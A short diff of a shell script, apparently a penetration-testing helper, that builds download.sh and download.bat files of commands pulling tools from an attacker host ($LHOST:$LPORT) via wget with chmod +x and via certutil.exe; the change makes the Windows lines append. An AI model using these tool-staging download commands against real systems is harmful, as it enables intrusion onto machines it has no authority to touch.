@@ -35,7 +35,7 @@ for TOOL_URL in $TOOL_URLS; do
         echo "wget http://$LHOST:$LPORT/$TOOL_NAME; chmod +x $TOOL_NAME" >> download.sh
     fi
     if [ $1 == "windows" ]; then
-        echo "certutil.exe -urlcache -split -f http://$LHOST:$LPORT/$TOOL_NAME $TOOL_NAME" > download.bat
+        echo "certutil.exe -urlcache -split -f http://$LHOST:$LPORT/$TOOL_NAME $TOOL_NAME" >> download.bat
     fi
 
 done
